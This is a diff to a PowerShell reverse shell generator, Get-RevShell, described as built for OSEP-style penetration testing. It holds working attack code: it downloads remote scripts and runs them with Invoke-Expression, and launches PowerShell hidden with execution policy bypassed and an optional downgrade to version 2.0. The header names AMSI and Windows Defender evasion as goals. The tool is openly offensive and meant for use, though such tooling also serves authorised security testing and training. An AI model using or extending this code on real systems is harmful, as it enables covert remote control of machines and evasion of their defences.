@@ -1,13 +1,13 @@
 ﻿function Get-RevShell {
 #.SYNOPSIS
 # Modular and Robust PowerShell Reverse Shell Generator focused on Basic AMSI Evasion
-# ARBITRARY VERSION NUMBER:  3.5.0
+# ARBITRARY VERSION NUMBER:  3.5.3
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
 # Originally developed for OSEP, this tool has been overhauled to create modular, robust custom reverse shells
 # with randomly generated variables that can bypass Windows Defender, provide seemless encryption, and have 
-# built-in functions for intuitive lateral file tranfers.
+# built-in functions for intuitive lateral file transfers.
 #
 # Overview:
 #  [+] Base reverse shell has built-in error output and support for information output streams (PowerShell 5.0+)
@@ -41,7 +41,7 @@
 #      -SSL                   -->   Encrypt reverse shell via SSL with self-signed certificates
 #      -HttpsBypass           -->   Disable HTTPS self-signed certificate checks in the session
 #      -B64Reflection         -->   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload
-#      -PowerShell2Support    -->   Adjust the reverse shell payload to support PowerShell 2.0
+#      -PowerShell2Support    -->   Adjust the reverse shell payload to use PowerShell 2.0
 #      -Binary                -->   PowerShell binary to use (default: 'powershell')
 #      -Headless              -->   Create reverse shell payload without '-nop -ex bypass -wi h' parameters
 #      -Verbose               -->   Make reverse shell variables descriptive instead of randomly generated
@@ -265,8 +265,8 @@ function import ([string]`$File) {
             return '[+] Reflection successful.' }
         else {
             $Var15 = $Var16.DownloadString("$WebClientHelpersURL/$Var11")
-            if (!($Var15 -like '*function global:*')) { $Var15 = $Var15.Replace('function ','function global:') }
-            Invoke-Expression $Var15
+            if (!($Var15 -like '*function global:*')) {$Var15 = $Var15 -ireplace [regex]::Escape('function '),'function global:'}
+            Invoke-Expression ($Var15)
             return '[+] Import successful.' } }
     Catch { return '[-] Import unsuccessful.' }
 }`n
@@ -310,8 +310,8 @@ function import ([string]`$File) {
             return '[+] Reflection successful.' }
         else {
             $Var15 = $Var16.DownloadString("$WebClientHelpersURL")
-            if (!($Var15 -like '*function global:*')) { $Var15 = $Var15.Replace('function ','function global:') }
-            Invoke-Expression $Var15
+            if (!($Var15 -like '*function global:*')) {$Var15 = $Var15 -ireplace [regex]::Escape('function '),'function global:'}
+            Invoke-Expression ($Var15)
             return '[+] Import successful.' } }
     Catch { return '[-] Import unsuccessful.' }
 }`n
@@ -492,9 +492,13 @@ $Var1.Close()
     $Payload = $SSCmodule + $Bypass1 + $Bypass2 + $WebClient + $RevShell
     
     
+    # Toggle PowerShell 2
+    if ($PowerShell2Support) { $BinParams = $Binary + ' -version 2' }
+    else                     { $BinParams = $Binary                 }
+
+
     # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
-    if (!$Headless) { $BinParams = $Binary + ' -nop -ex bypass -wi h' } 
-    else            { $BinParams = $Binary                    }
+    if (!$Headless) { $BinParams += ' -nop -ex bypass -wi h' } 
      
 
     # Cleartext or Base64 Payload
